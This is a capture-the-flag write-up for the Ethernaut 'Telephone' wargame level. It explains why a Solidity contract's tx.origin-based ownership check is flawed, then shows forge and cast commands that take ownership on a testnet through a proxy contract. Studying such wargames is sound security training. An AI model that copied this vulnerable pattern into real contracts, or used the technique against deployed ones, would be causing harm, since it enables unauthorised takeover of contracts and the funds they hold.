---
title: "Telephone"
tags: ["Proxy"]
reference: https://ethernaut.openzeppelin.com/level/4
---

# Description

Claim ownership of the contract below to complete this level.

- Things that might help


```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

# Solution

1. What is `tx.origin`?

In Solidity, tx.origin is a global variable that refers to the original external account (EOA) that initiated the transaction — even if the transaction passes through multiple smart contracts.

We can make `tx.origin != msg.sender` by calling `changeOwner` via a proxy contract?

2. Deploy [TelphoneProxy](lv_4/src/Proxy.sol) smart contract

```
forge create src/Proxy.sol:TelephoneProxy --rpc-url=$BASE_SEPOLIA_RPC --account deployer --broadcast
[⠃] Compiling...
No files changed, compilation skipped
Enter keystore password:
Deployer: 0xB1473Ba227C4645501E0e05f4839b00ED8320d33
Deployed to: 0x650cd15495fa04d0450eA1Dd2B9f164766f226Dd
Transaction hash: 0x5c23660ca92a840f8525ea631768475afbb5e988cde58e49b93ce96d3d1ad261
```

3. Get player and victim contract addresses

```
=> Instance address0x59fC2E3Ad3c4A6D4a4169815FDDe77CE7d5DAFe5
player
'0xB1473Ba227C4645501E0e05f4839b00ED8320d33'
```

4. Call `changeOwner()`

```
cast send 0x650cd15495fa04d0450eA1Dd2B9f164766f226Dd "changeOwner(address,address)" 0x59fC2E3Ad3c4A6D4a4169815FDDe77CE7d5DAFe5 0xB1473Ba227C4645501E0e05f4839b00ED8320d33 --rpc-url $BASE_SEPOLIA_RPC --private-key 
```

5. check the updated owner

```
await contract.owner()
'0xB1473Ba227C4645501E0e05f4839b00ED8320d33'
```
